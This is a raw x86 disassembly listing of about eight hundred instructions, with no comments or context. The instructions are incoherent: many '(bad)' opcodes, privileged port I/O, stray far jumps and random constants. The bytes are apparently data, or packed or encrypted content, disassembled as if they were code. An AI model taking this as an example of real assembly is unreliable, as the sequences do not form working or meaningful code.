  418539:	pusha  
  41853a:	jle    0x4184e6
  41853c:	cmp    DWORD PTR [edx],ecx
  41853e:	xchg   ebp,eax
  41853f:	mov    al,ds:0x968b0c7d
  418544:	lds    ebp,FWORD PTR [ecx+0x2d]
  418547:	scas   al,BYTE PTR es:[edi]
  418548:	xchg   esp,eax
  418549:	xchg   ebx,eax
  41854a:	mov    al,ds:0xfe27d5b4
  41854f:	jp     0x4184d7
  418551:	jge    0x4185a9
  418553:	mov    ebp,0x8c5d7da0
  418558:	rol    DWORD PTR [eax],0x4b
  41855b:	add    ecx,DWORD PTR [eax]
  41855d:	jbe    0x418528
  41855f:	in     al,0x7e
  418561:	in     eax,0x55
  418563:	pop    esp
  418564:	push   edx
  418565:	rol    bl,0x91
  418568:	jns    0x41850e
  41856a:	sub    dl,BYTE PTR [edi+0x7e]
  41856d:	pop    esi
  41856e:	in     eax,dx
  41856f:	add    BYTE PTR [esi+eax*1],dh
  418572:	inc    edx
  418573:	pop    esi
  418574:	xchg   edx,eax
  418575:	push   ds
  418576:	sub    ebx,esi
  418578:	mov    gs,WORD PTR [ecx-0x55eadb5c]
  41857e:	push   cs
  41857f:	imul   esp,DWORD PTR [eax-0x37],0x4c10830c
  418586:	push   esp
  418587:	ret    
  418588:	jle    0x418552
  41858a:	scas   eax,DWORD PTR es:[edi]
  41858b:	imul   edx,DWORD PTR [eax+eiz*8+0x1eb70e62],0x3c
  418593:	call   0x6722:0x6b76a00b
  41859a:	into   
  41859b:	outs   dx,DWORD PTR ds:[esi]
  41859c:	mov    bh,0xaf
  41859e:	add    al,0xdb
  4185a0:	and    al,0xaa
  4185a2:	in     eax,dx
  4185a3:	sub    esp,DWORD PTR [ecx]
  4185a5:	mov    BYTE PTR [ebx+ebx*4],ah
  4185a8:	pusha  
  4185a9:	mov    bl,0x1d
  4185ab:	mov    eax,ds:0x78c67445
  4185b0:	adc    al,0x50
  4185b2:	and    eax,0x198cde43
  4185b7:	or     BYTE PTR [ebp+edx*8+0x4ea0cbf0],0x60
  4185bf:	push   es
  4185c0:	dec    eax
  4185c1:	jmp    0xcc84:0x7ae80a7b
  4185c8:	sub    al,0x4a
  4185ca:	enter  0xde5c,0xa1
  4185ce:	jae    0x4185d6
  4185d0:	nop
  4185d1:	jbe    0x41862e
  4185d3:	xor    ebp,DWORD PTR [ecx-0x23]
  4185d6:	add    BYTE PTR [edx+edx*4],dh
  4185d9:	mov    edi,eax
  4185db:	loope  0x418563
  4185dd:	pushf  
  4185de:	ret    
  4185df:	dec    ebx
  4185e0:	aaa    
  4185e1:	add    ecx,DWORD PTR [esi-0x68ad004d]
  4185e7:	pop    eax
  4185e8:	jl     0x418649
  4185ea:	test   al,0x19
  4185ec:	arpl   WORD PTR [ebx-0x572e7386],dx
  4185f2:	inc    eax
  4185f3:	call   0x5096:0x1b2d9fd1
  4185fa:	fcom   st(6)
  4185fc:	pop    ss
  4185fd:	push   ebp
  4185fe:	pop    ebx
  4185ff:	outs   dx,DWORD PTR ds:[esi]
  418600:	das    
  418601:	ss xchg ebx,eax
  418603:	jge    0x41861c
  418605:	bound  esi,QWORD PTR [eax]
  418607:	outs   dx,DWORD PTR ds:[esi]
  418608:	xor    ebp,ecx
  41860a:	mov    al,0x20
  41860c:	xchg   edi,eax
  41860d:	and    ebx,edx
  41860f:	out    0x69,al
  418611:	pop    es
  418612:	adc    dh,BYTE PTR [ecx+0x15]
  418615:	fcomp  QWORD PTR [edx+0x6bb4871d]
  41861b:	repnz div DWORD PTR [esi-0x7f7a4744]
  418622:	or     DWORD PTR [ebx+0x47c454fe],ecx
  418628:	int3   
  418629:	and    al,0x92
  41862b:	mov    bl,0x76
  41862d:	lock push 0x9
  418630:	pop    edx
  418631:	mov    cl,0x13
  418633:	sahf   
  418634:	cmp    eax,0x6d6d5822
  418639:	mov    al,ds:0x6f61ff70
  41863e:	adc    DWORD PTR [edx+0x3a44ff3c],ecx
  418644:	fs cmp eax,0x738bce8b
  41864a:	jne    0x418693
  41864c:	mov    bl,0x63
  41864e:	xrelease xchg DWORD PTR [esi+0x281a48d2],edx
  418655:	ja     0x41861d
  418657:	sub    di,bp
  41865a:	pop    ebx
  41865b:	add    dl,bh
  41865d:	(bad)  
  41865e:	dec    edi
  41865f:	stos   BYTE PTR es:[edi],al
  418660:	cs jne 0x41864f
  418663:	cdq    
  418664:	jae    0x41869e
  418666:	repz mov dl,0xe7
  418669:	sbb    edi,DWORD PTR [edi-0x50a55261]
  41866f:	hlt    
  418670:	mov    ds:0xca4e3f31,eax
  418675:	mov    ah,bh
  418677:	lahf   
  418678:	cwde   
  418679:	retf   
  41867a:	daa    
  41867b:	lds    esp,FWORD PTR [ebx]
  41867d:	adc    esi,DWORD PTR [esp+edx*2]
  418680:	push   eax
  418681:	sbb    DWORD PTR [edx],edx
  418683:	cli    
  418684:	mov    ebp,0x6b883e51
  418689:	ror    DWORD PTR [edi],1
  41868b:	out    dx,eax
  41868c:	cli    
  41868d:	cmc    
  41868e:	fs and ebp,edx
  418691:	adc    BYTE PTR [edi-0x1f],ch
  418694:	stos   DWORD PTR es:[edi],eax
  418695:	cmp    dl,BYTE PTR [ebp+0x2bb4c346]
  41869b:	iret   
  41869c:	cmp    al,BYTE PTR [edi+0x66a72ade]
  4186a2:	stos   DWORD PTR es:[edi],eax
  4186a3:	punpckhbw mm2,mm5
  4186a6:	imul   edi,DWORD PTR [edi],0x5
  4186a9:	test   DWORD PTR [ebp+esi*4+0x4019b8cb],0x4ebf156e
  4186b4:	int    0xaa
  4186b6:	add    ah,ah
  4186b8:	jns    0x418731
  4186ba:	cmp    DWORD PTR [eax+0x22],0xa8d06c41
  4186c1:	dec    eax
  4186c2:	das    
  4186c3:	add    bh,BYTE PTR [ebx+0x417334c3]
  4186c9:	xchg   ecx,eax
  4186ca:	inc    eax
  4186cb:	test   eax,0x40a0f5a5
  4186d0:	fwait
  4186d1:	xlat   BYTE PTR ds:[ebx]
  4186d2:	stos   DWORD PTR es:[edi],eax
  4186d3:	icebp  
  4186d4:	and    ecx,ebp
  4186d6:	sub    eax,0x721cba6c
  4186db:	mov    esi,edx
  4186dd:	arpl   WORD PTR [ecx+0x53b7a15b],si
  4186e3:	mov    esi,0x944f8c2f
  4186e8:	or     al,0xed
  4186ea:	cdq    
  4186eb:	mov    bl,0xf8
  4186ed:	in     al,dx
  4186ee:	fidivr DWORD PTR [edx]
  4186f0:	sar    BYTE PTR [eax-0x41],1
  4186f3:	adc    BYTE PTR [ecx-0x1aa988af],ch
  4186f9:	mov    ebx,0x92e89167
  4186fe:	ja     0x4186fe
  418700:	js     0x418685
  418702:	or     eax,0x7164262b
  418707:	cdq    
  418708:	adc    esp,DWORD PTR [ebx]
  41870a:	int    0x48
  41870c:	pop    ebx
  41870d:	sbb    BYTE PTR [edx+0x34],al
  418710:	and    eax,0x93457ca7
  418715:	aas    
  418716:	cmp    dh,BYTE PTR ds:[ecx+edx*2-0x30]
  41871b:	clc    
  41871c:	test   ch,dh
  41871e:	mov    dh,0x62
  418720:	jns    0x41875e
  418722:	ins    BYTE PTR es:[edi],dx
  418723:	leave  
  418724:	xchg   esi,eax
  418725:	js     0x4186f0
  418727:	fsubrp st(1),st
  418729:	sbb    al,0x44
  41872b:	gs iret 
  41872d:	pop    esp
  41872e:	fld    TBYTE PTR [ebp-0x72259ec6]
  418734:	cmp    DWORD PTR [ecx],ebp
  418736:	lods   al,BYTE PTR ds:[esi]
  418737:	sbb    eax,0x6e32a6f0
  41873c:	adc    al,0x4e
  41873e:	jge    0x41875f
  418740:	(bad)  
  418741:	cdq    
  418742:	adc    ecx,edx
  418744:	bound  eax,QWORD PTR [ecx-0x12]
  418747:	test   BYTE PTR [eax-0x4d],bh
  41874a:	mov    dl,0x25
  41874c:	push   esp
  41874d:	adc    al,0x7a
  41874f:	mov    DWORD PTR [eax],esi
  418751:	push   eax
  418752:	es cmc 
  418754:	fst    QWORD PTR [esi+eiz*8+0x25]
  418758:	sbb    edi,eax
  41875a:	pop    ebp
  41875b:	and    DWORD PTR [esi],ebp
  41875d:	jno    0x41875b
  41875f:	push   cs
  418760:	imul   ebp,DWORD PTR ds:0x549b9a05,0x7f
  418767:	cld    
  418768:	mov    bl,0x12
  41876a:	jmp    0x4187ca
  41876c:	enter  0x22cb,0x43
  418770:	mov    eax,0x85aae5fb
  418775:	inc    eax
  418776:	mov    esp,0xa624e350
  41877b:	pop    esp
  41877c:	outs   dx,DWORD PTR ds:[esi]
  41877d:	xchg   edx,eax
  41877e:	mul    BYTE PTR [edi]
  418780:	stos   DWORD PTR es:[edi],eax
  418781:	dec    esi
  418782:	or     DWORD PTR [edi],0xffffff8a
  418785:	outs   dx,BYTE PTR ds:[esi]
  418786:	nop
  418787:	call   0x4b375157
  41878c:	aaa    
  41878d:	fwait
  41878e:	dec    esi
  41878f:	rep lods al,BYTE PTR ds:[esi]
  418791:	outs   dx,DWORD PTR ds:[esi]
  418792:	mov    bh,BYTE PTR [eax-0x6587ca5c]
  418798:	mov    ebp,0x591b98b
  41879d:	(bad)  
  41879e:	in     eax,dx
  41879f:	cld    
  4187a0:	push   cs
  4187a1:	sbb    eax,0x2a806e92
  4187a6:	dec    esp
  4187a7:	ror    BYTE PTR [edx+0x63],1
  4187aa:	ror    eax,0x71
  4187ad:	ds jno 0x418773
  4187b0:	std    
  4187b1:	test   BYTE PTR [edx-0xb],bh
  4187b4:	scas   eax,DWORD PTR es:[edi]
  4187b5:	push   gs
  4187b7:	sbb    al,0x95
  4187b9:	gs daa 
  4187bb:	aam    0x7
  4187bd:	or     BYTE PTR [ecx-0x62],bh
  4187c0:	sbb    al,0xc7
  4187c2:	sbb    ch,dl
  4187c4:	sub    ebp,DWORD PTR [eax-0x60]
  4187c7:	ror    ah,1
  4187c9:	sbb    ah,ch
  4187cb:	cmp    eax,0x49328177
  4187d0:	or     al,0xe9
  4187d2:	outs   dx,DWORD PTR ds:[esi]
  4187d4:	lods   al,BYTE PTR ds:[esi]
  4187d5:	imul   ebx,DWORD PTR [ecx-0x628f8c2],0xffffffdb
  4187dc:	data16 fstp DWORD PTR [esi+0xcc29bc9]
  4187e3:	dec    ebx
  4187e4:	mov    edi,0x24463f26
  4187e9:	xor    BYTE PTR [eax+0x4d],dl
  4187ec:	or     DWORD PTR [ecx+0x36],ecx
  4187ef:	lea    ebx,[esi]
  4187f1:	lods   al,BYTE PTR ds:[esi]
  4187f2:	les    ecx,FWORD PTR [eax-0x78]
  4187f5:	push   eax
  4187f6:	cdq    
  4187f7:	inc    edi
  4187f8:	es and eax,0x99f59622
  4187fe:	cmp    eax,0x1a131ec8
  418803:	inc    ebp
  418804:	lahf   
  418805:	lea    esp,[eax+0x232aecab]
  41880b:	das    
  41880c:	lea    ebp,[ebp+0x2]
  41880f:	mov    ss,WORD PTR [ebx]
  418811:	loopne 0x41879b
  418813:	dec    esi
  418814:	pop    esp
  418815:	xchg   esp,eax
  418816:	imul   edx,edi,0x1
  418819:	or     eax,0xf89d3665
  41881e:	mov    bh,0x13
  418820:	add    ah,al
  418822:	mov    ecx,DWORD PTR [ebx+0x24]
  418825:	into   
  418826:	jns    0x418806
  418828:	lahf   
  418829:	aaa    
  41882a:	xchg   edi,eax
  41882b:	and    eax,DWORD PTR [eax]
  41882d:	xor    al,0x1b
  41882f:	in     eax,dx
  418830:	cmc    
  418831:	jle    0x418831
  418833:	xlat   BYTE PTR ds:[ebx]
  418834:	bnd jb 0x418841
  418837:	test   DWORD PTR [eax+0x33],esi
  41883a:	dec    ebx
  41883b:	ins    BYTE PTR es:[edi],dx
  41883c:	cs pmaxsw mm6,mm4
  418840:	pop    edi
  418841:	loop   0x4187ee
  418843:	jnp    0x4188a2
  418845:	nop
  418846:	cmc    
  418847:	add    al,BYTE PTR ds:0x1b49bef6
  41884d:	(bad)  
  41884e:	cmc    
  41884f:	push   ebp
  418850:	xor    BYTE PTR [edi],ch
  418852:	sbb    BYTE PTR [eax],dh
  418854:	pop    ss
  418855:	es push es
  418857:	in     eax,dx
  418858:	jmp    0xbcb9:0xd4b76b2d
  41885f:	fwait
  418860:	retf   0x34a8
  418863:	rcl    DWORD PTR [ebp+0x287abeca],1
  418869:	pop    eax
  41886a:	in     eax,0xb0
  41886c:	in     al,dx
  41886d:	cmp    dh,dh
  41886f:	hlt    
  418870:	lahf   
  418871:	outs   dx,DWORD PTR ds:[esi]
  418872:	retf   0x126
  418875:	lods   eax,DWORD PTR ds:[esi]
  418876:	push   ecx
  418877:	mov    al,0xaf
  418879:	xchg   ebx,eax
  41887a:	les    ecx,FWORD PTR [esi]
  41887c:	jmp    0x418890
  41887e:	mov    ah,0x6b
  418880:	adc    eax,0xc1c0d265
  418885:	jae    0x41881a
  418887:	leave  
  418888:	out    dx,al
  418889:	lods   al,BYTE PTR ds:[esi]
  41888a:	or     eax,0x5c493579
  41888f:	out    dx,eax
  418890:	xchg   ebp,eax
  418891:	pusha  
  418892:	test   eax,0xca04d6f
  418897:	mov    ss,WORD PTR gs:[eax+0x18]
  41889b:	dec    esp
  41889c:	fld    st(6)
  41889e:	xchg   ebx,eax
  41889f:	mov    bl,0xf4
  4188a1:	mov    ebp,0x970bbaa7
  4188a6:	jmp    0x4188d4
  4188a8:	mov    edx,0x5f43f8a
  4188ad:	mov    esp,0x451883f6
  4188b2:	jae    0x418845
  4188b4:	data16 cld 
  4188b6:	inc    edx
  4188b7:	int3   
  4188b8:	xchg   ebp,eax
  4188b9:	rcl    BYTE PTR [eax],0x1c
  4188bc:	sbb    al,0x44
  4188be:	mov    ah,BYTE PTR [esi+0x3f]
  4188c1:	btc    DWORD PTR [edi-0x165c707],esp
  4188c8:	not    DWORD PTR [edx+0x7f]
  4188cb:	or     bh,BYTE PTR [edx]
  4188cd:	inc    ebp
  4188ce:	cmp    esp,DWORD PTR [ebp-0x617a583d]
  4188d4:	add    BYTE PTR [esi-0x49],ah
  4188d7:	add    al,0xa0
  4188d9:	imul   esp,DWORD PTR [esi+ecx*2],0xffffffe6
  4188dd:	or     cl,BYTE PTR [eax-0x44fdecc5]
  4188e3:	and    BYTE PTR [esi],0x9e
  4188e6:	add    edi,DWORD PTR [edi]
  4188e8:	dec    eax
  4188e9:	mov    WORD PTR [ebx-0x5b],fs
  4188ec:	inc    ebx
  4188ed:	test   al,0x1b
  4188ef:	push   esi
  4188f0:	adc    BYTE PTR [ebx],dh
  4188f2:	xchg   ecx,eax
  4188f3:	jcxz   0x4188a9
  4188f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f7:	inc    ebx
  4188f8:	jge    0x41887c
  4188fa:	fld    DWORD PTR [edx-0x3f73630a]
  418900:	add    edx,0x5e
  418903:	ret    0x6547
  418906:	mov    ebp,0x4cdf581e
  41890b:	popa   
  41890c:	sbb    al,0xf
  41890e:	scas   eax,DWORD PTR es:[edi]
  41890f:	pop    ebx
  418910:	mov    BYTE PTR [esi+eiz*4-0x171a1841],bh
  418917:	pop    edi
  418918:	adc    DWORD PTR [eax],edi
  41891a:	mov    esp,0x314af1ff
  41891f:	retf   
  418920:	jne    0x418956
  418922:	es xchg edx,eax
  418924:	aaa    
  418925:	ja     0x4188fd
  418927:	repz loop 0x41897f
  41892a:	fadd   st,st(3)
  41892c:	mov    edi,0x3b86e991
  418931:	clc    
  418932:	stos   DWORD PTR es:[edi],eax
  418933:	pop    es
  418934:	jp     0x4188e2
  418936:	or     ebp,edx
  418938:	mov    eax,0x1e251748
  41893d:	mov    al,ds:0x7489ee45
  418942:	push   0xf2bc8918
  418947:	cdq    
  418948:	sub    ch,al
  41894a:	into   
  41894b:	fldcw  WORD PTR [ebx+ebp*2+0x7918be02]
  418952:	mov    dl,0xb7
  418954:	push   ebp
  418955:	pop    eax
  418956:	jg     0x41895b
  418958:	lock mov esp,0xbb9ab3de
  41895e:	sti    
  41895f:	add    ch,BYTE PTR [ecx+0x51]
  418962:	jmp    0x8fd84fa
  418967:	repnz xchg edx,eax
  418969:	fimul  DWORD PTR [edi]
  41896b:	inc    eax
  41896c:	dec    ebp
  41896d:	jmp    0x32c2:0x37818f6c
  418974:	push   ebx
  418975:	mov    dh,0xe0
  418977:	add    BYTE PTR ds:0x5d4110b4,bh
  41897d:	cmp    DWORD PTR [ebp-0x63],eax
  418980:	(bad)  
  418981:	shl    DWORD PTR [edi+0xe],1
  418984:	fsub   st(2),st
  418986:	call   0xc119:0x33d5d033
  41898d:	mov    bh,0x1b
  41898f:	mov    ah,BYTE PTR [edi+edx*2+0x7e3575ab]
  418996:	dec    ecx
  418997:	push   0xe7f775e7
  41899c:	or     eax,0xf5be2b25
  4189a1:	fs and al,0x63
  4189a4:	ret    
  4189a5:	adc    al,0xc6
  4189a7:	enter  0x4732,0xe7
  4189ab:	lds    edi,FWORD PTR [ebx]
  4189ad:	sbb    edx,DWORD PTR [ebx]
  4189af:	or     eax,0xa4012d9d
  4189b4:	fsub   QWORD PTR [ecx+0x42]
  4189b7:	xor    BYTE PTR [ecx],dh
  4189b9:	xlat   BYTE PTR ds:[ebx]
  4189ba:	scas   eax,DWORD PTR es:[edi]
  4189bb:	pop    edi
  4189bc:	adc    eax,DWORD PTR [ecx+0x18]
  4189bf:	jmp    0x41896f
  4189c1:	mov    DWORD PTR [ebx+0x4602ecc5],edx
  4189c7:	jle    0x4189b1
  4189c9:	popf   
  4189ca:	mov    ds:0x9b74149b,eax
  4189cf:	jne    0x4189a6
  4189d1:	push   0x7d7f4711
  4189d6:	push   ebx
  4189d7:	cld    
  4189d8:	xor    dh,BYTE PTR [eax+0x1b05973c]
  4189de:	je     0x418a08
  4189e0:	mov    ds:0x6471ffd,eax
  4189e5:	lock and eax,DWORD PTR [edi]
  4189e8:	(bad)  
  4189e9:	sbb    ah,ah
  4189eb:	push   eax
  4189ec:	fild   QWORD PTR [ebp-0x34]
  4189ef:	sar    DWORD PTR [edi+0x14],1
  4189f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f3:	pop    edx
  4189f4:	push   ecx
  4189f5:	pop    es
  4189f6:	das    
  4189f7:	cmc    
  4189f8:	out    dx,eax
  4189f9:	hlt    
  4189fa:	jecxz  0x4189bd
  4189fc:	sub    DWORD PTR [eax],0xffffffc6
  4189ff:	out    dx,eax
  418a00:	retf   
  418a01:	sbb    BYTE PTR [edx-0x7027c139],ch
  418a07:	inc    esi
  418a08:	push   es
  418a09:	push   edi
  418a0a:	xor    al,0x57
  418a0c:	cmp    al,BYTE PTR [eax+0x6b]
  418a0f:	aam    0x66
  418a11:	jmp    0x4189c3
  418a13:	dec    ebx
  418a14:	jmp    0x6565:0x713702f4
  418a1b:	adc    al,0x21
  418a1d:	out    0x6c,al
  418a1f:	cmp    ebx,DWORD PTR [esp+esi*2-0x69a9ded2]
  418a26:	jae    0x4189f4
  418a28:	cmp    BYTE PTR [ebx],ch
  418a2a:	sub    esp,esp
  418a2c:	(bad)  
  418a2d:	es pusha 
  418a2f:	(bad)  
  418a30:	repnz in al,dx
  418a32:	push   ecx
  418a33:	sbb    BYTE PTR [ecx+edi*4+0x6d7c2ebe],ch
  418a3a:	sbb    BYTE PTR [edx+ebx*8],ah
  418a3d:	pop    edi
  418a3e:	jg     0x4189e2
  418a40:	fiadd  WORD PTR [si+0x74b8]
  418a45:	and    DWORD PTR [ecx],eax
  418a47:	push   edx
  418a48:	jo     0x418a6e
  418a4a:	jbe    0x418a3c
  418a4c:	hlt    
  418a4d:	gs xor edx,ebp
  418a50:	in     al,dx
  418a51:	pop    ds
  418a52:	std    
  418a53:	xchg   ecx,eax
  418a54:	sbb    dh,BYTE PTR ds:0xe1d94b62
  418a5a:	js     0x418a19
  418a5c:	fild   WORD PTR [ebx+0x41]
  418a5f:	inc    edx
  418a60:	xchg   edi,eax
  418a61:	aaa    
  418a62:	sti    
  418a63:	mov    ds:0x53015cb1,al
  418a68:	sub    dh,BYTE PTR [ebp+0xcd61760]
  418a6e:	add    al,0x2
  418a70:	lods   eax,DWORD PTR ds:[esi]
  418a71:	ja     0x418a8a
  418a73:	stos   BYTE PTR es:[edi],al
  418a74:	xchg   esp,eax
  418a75:	pushf  
  418a76:	pop    ss
  418a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a78:	pop    es
  418a79:	hlt    
  418a7a:	(bad)  
  418a7b:	(bad)  
  418a7c:	ror    esp,cl
  418a7e:	cld    
  418a7f:	int    0xad
  418a81:	inc    ecx
  418a82:	mov    eax,ds:0x4daa4820
  418a87:	ret    0xc090
  418a8a:	and    BYTE PTR [edx],ah
  418a8c:	add    DWORD PTR [esi-0x6b32e1db],ebp
  418a92:	pop    es
  418a93:	lea    ebp,[esi-0x4f]
  418a96:	fnstsw WORD PTR [ebx]
  418a98:	loope  0x418afa
  418a9a:	(bad)  
  418a9b:	xchg   dh,bh
  418a9d:	outs   dx,BYTE PTR ds:[esi]
  418a9e:	ins    DWORD PTR es:[edi],dx
  418a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa0:	jnp    0x418abb
  418aa2:	jo     0x418a35
  418aa4:	jae    0x418a34
  418aa6:	inc    edx
  418aa7:	push   ebx
  418aa8:	push   edx
  418aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aaa:	push   edx
  418aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aac:	xchg   BYTE PTR [esi-0x6e80a88e],bl
  418ab2:	sahf   
  418ab3:	in     eax,dx
  418ab4:	ins    DWORD PTR es:[edi],dx
  418ab5:	and    ecx,DWORD PTR [edx]
  418ab7:	pop    ss
  418ab8:	fnstenv [ebx+0xbde1c0]
  418abe:	fcom   DWORD PTR [ebp+0x14]
  418ac1:	aam    0x45
  418ac3:	push   0x716a3122
  418ac8:	mov    cl,0x3
  418aca:	loopne 0x418a53
  418acc:	add    ebp,DWORD PTR [ebp+0x11]
  418acf:	stos   DWORD PTR es:[edi],eax
  418ad0:	shl    DWORD PTR [edx+eiz*1+0x30381ccc],cl
  418ad7:	(bad)  
  418ad8:	int3   
  418ad9:	jnp    0x418a87
  418adb:	dec    esp
  418adc:	mov    dh,0x59
  418ade:	mov    esp,0x6259bf06
  418ae3:	mov    dl,0xa2
  418ae5:	jg     0x418a6c
  418ae7:	sbb    al,0x95
  418ae9:	rol    esp,1
  418aeb:	les    ecx,FWORD PTR [edx]
  418aed:	cli    
  418aee:	dec    eax
  418aef:	pusha  
  418af0:	fidivr DWORD PTR [edx+0x46]
  418af3:	rcr    BYTE PTR [eax+0x3],cl
  418af6:	mov    al,0x5a
  418af8:	mov    bh,0x29
  418afa:	leave  
  418afb:	stos   BYTE PTR es:[edi],al
  418afc:	adc    al,0xa3
  418afe:	fwait
  418aff:	adc    eax,DWORD PTR [ecx+eax*1-0x2709bf79]
  418b06:	push   ebx
  418b07:	inc    ebp
  418b08:	cli    
  418b09:	outs   dx,BYTE PTR ds:[esi]
  418b0a:	ret    0x64b8
  418b0d:	(bad)  
  418b0e:	aaa    
  418b0f:	ds ss pop edx
  418b12:	retf   0xc4b6
  418b15:	pop    edx
  418b16:	js     0x418b28
  418b18:	out    dx,eax
  418b19:	push   0x620ce7d3
  418b1e:	and    ebp,DWORD PTR [eax]
  418b20:	in     eax,dx
  418b21:	jnp    0x418adb
  418b23:	inc    esp
  418b24:	jmp    WORD PTR [eax-0x42]
  418b28:	xlat   BYTE PTR ds:[ebx]
  418b29:	int3   
  418b2a:	nop
  418b2b:	dec    ecx
  418b2c:	shl    BYTE PTR [esi-0x78],cl
  418b2f:	push   0xffffff9f
  418b31:	popf   
  418b32:	inc    ebp
  418b33:	retf   
  418b34:	push   es
  418b35:	mov    bh,0xe0
  418b37:	cmp    BYTE PTR [eax-0x36aefa6],0xb4
  418b3e:	daa    
  418b3f:	dec    ecx
  418b40:	or     al,0x5e
  418b42:	pop    es
  418b43:	test   DWORD PTR [ecx+0x75540552],esi
  418b49:	lods   eax,DWORD PTR ds:[esi]
  418b4a:	inc    edx
  418b4b:	add    eax,0x11e3ced5
  418b50:	lock cmp dh,BYTE PTR [ebx-0x75]
  418b54:	xlat   BYTE PTR ds:[ebx]
  418b55:	aam    0x2f
  418b57:	xchg   dh,cl
  418b59:	jl     0x418bd1
  418b5b:	ds popf 
  418b5d:	cmp    edx,DWORD PTR [ecx-0x5fc14c2c]
  418b63:	call   0xc4ae214c
  418b68:	add    BYTE PTR [ecx+0x5a22e649],dl
  418b6e:	outs   dx,BYTE PTR ds:[esi]
  418b6f:	push   ds
  418b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b71:	mov    bh,0x2c
  418b73:	in     eax,0x32
  418b75:	dec    edx
  418b76:	push   0x2a
  418b78:	in     al,0xee
  418b7a:	stos   BYTE PTR es:[edi],al
  418b7b:	xchg   edi,eax
  418b7c:	mov    WORD PTR ds:0x2a1a0439,?
  418b82:	push   edi
  418b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b84:	cmp    al,0x1a
  418b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b87:	call   0xd6a2:0xbe38e869
  418b8e:	sbb    eax,0x11d7fc9f
  418b93:	sbb    BYTE PTR [ebx-0x52c8ed8],ah
  418b99:	dec    ebx
  418b9a:	cli    
  418b9b:	mov    ds:0xb30d8c9e,al
  418ba0:	mov    ds:0x1cc404b9,eax
  418ba5:	cmp    edx,DWORD PTR [esi+0x47064da0]
  418bab:	mov    edx,0x98ac4dd6
  418bb0:	cdq    
  418bb1:	out    0x24,eax
  418bb3:	sti    
  418bb4:	loop   0x418b58
  418bb6:	xchg   edi,eax
  418bb7:	inc    ecx
  418bb8:	sahf   
  418bb9:	and    esi,esi
  418bbb:	xor    DWORD PTR [ebp+0x5c],edi
  418bbe:	xchg   edx,eax
  418bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bc0:	xchg   esp,eax
  418bc1:	jle    0x418b77
  418bc3:	js     0x418b98
  418bc5:	sub    cl,ch
  418bc7:	and    cl,BYTE PTR [edx]
  418bc9:	push   es
  418bca:	fwait
  418bcb:	repz dec edi
  418bcd:	enter  0x5065,0x92
  418bd1:	mov    edx,0xa441d567
  418bd6:	(bad)  
  418bd7:	pop    esi
  418bd8:	mov    esi,0xb3c4de8a
  418bdd:	scas   eax,DWORD PTR es:[edi]
  418bde:	std    
  418bdf:	out    0xd,al
  418be1:	mov    esp,0x3f94f9eb
  418be6:	pusha  
  418be7:	push   ecx
  418be8:	push   ebp
  418be9:	jp     0x418ba9
  418beb:	fucom  st(7)
  418bed:	nop
  418bee:	dec    edi
  418bef:	(bad)  
  418bf0:	mov    edx,0x95b56c41
  418bf5:	inc    esi
  418bf6:	gs jnp 0x418c13
  418bf9:	inc    ecx
  418bfa:	outs   dx,BYTE PTR ds:[esi]
  418bfb:	clc    
  418bfc:	cmp    DWORD PTR [ecx+0x1c],esi
  418bff:	mov    ds:0xe78be8fd,eax
  418c04:	cmp    DWORD PTR [ebp+0x41520a9a],esi
  418c0a:	repnz aas 
  418c0c:	loop   0x418bcb
  418c0e:	mov    dl,0x5e
  418c10:	mov    bl,0x90
  418c12:	inc    edx
  418c13:	mov    ebp,DWORD PTR [ecx]
  418c15:	mov    gs,WORD PTR [edi-0x8]
  418c18:	pusha  
  418c19:	inc    esp
  418c1a:	xlat   BYTE PTR ds:[ebx]
  418c1b:	dec    esp
  418c1c:	mov    edx,0xd037ab62
  418c21:	sbb    eax,DWORD PTR [edx]
  418c23:	jecxz  0x418c37
  418c25:	std    
  418c26:	push   es
  418c27:	xchg   ecx,eax
  418c28:	popf   
  418c29:	jno    0x418c6a
  418c2b:	bswap  edi
  418c2d:	add    eax,0xb9e1c169
  418c32:	(bad)  
  418c33:	mov    al,0x65
  418c35:	leave  
  418c36:	xor    dh,BYTE PTR ds:[edi+0x2b]
  418c3a:	dec    ebx
  418c3b:	pop    ebx
  418c3c:	push   0xffffffbf
  418c3e:	add    BYTE PTR [eax-0x44],dh
  418c41:	ss mov ecx,0xdbb239be
  418c47:	nop
  418c48:	push   edi
  418c49:	xchg   ecx,eax
  418c4a:	push   ss
  418c4b:	cmp    eax,0xa09ddf38
  418c50:	popa   
  418c51:	pop    esp
  418c52:	in     al,0x49
  418c54:	xor    dh,bl
  418c56:	(bad)  
  418c57:	and    al,BYTE PTR [edx-0x8]
  418c5a:	(bad)
  418c5f:	push   ebp
  418c60:	inc    ecx
  418c61:	ins    DWORD PTR es:[edi],dx
  418c62:	cmp    BYTE PTR [eax-0x44],cl
  418c65:	scas   al,BYTE PTR es:[edi]
  418c66:	lods   al,BYTE PTR ds:[esi]
  418c67:	test   al,0xa9
  418c69:	push   edx
  418c6a:	mov    al,ds:0x983b31a5
  418c6f:	or     eax,0x63968933
  418c74:	sbb    eax,DWORD PTR [ebx+0x7fa1c902]
  418c7a:	adc    BYTE PTR [eax+ecx*8+0x55],0x1b
  418c7f:	addr16 push ecx
  418c81:	jo     0x418c08
  418c83:	mov    al,0x43
  418c85:	lds    ebp,FWORD PTR [edi-0x5e]
  418c88:	mov    ebp,0xbbdc644a
  418c8d:	sahf   
  418c8e:	dec    edi
  418c8f:	pop    edx
  418c90:	jg     0x418ce9
  418c92:	inc    ebp
  418c93:	pop    edi
  418c94:	fmul   QWORD PTR [ecx]
  418c96:	and    esi,0x4dd9600d
  418c9c:	pop    ds
  418c9d:	test   al,0x36
  418c9f:	push   ss
  418ca0:	lods   al,BYTE PTR ds:[esi]
  418ca1:	dec    ebp
  418ca2:	dec    ebx
  418ca3:	inc    ecx
  418ca4:	pop    eax
  418ca5:	mov    ss,edx
  418ca7:	cmp    eax,0x44427aa7
  418cac:	jle    0x418cc1
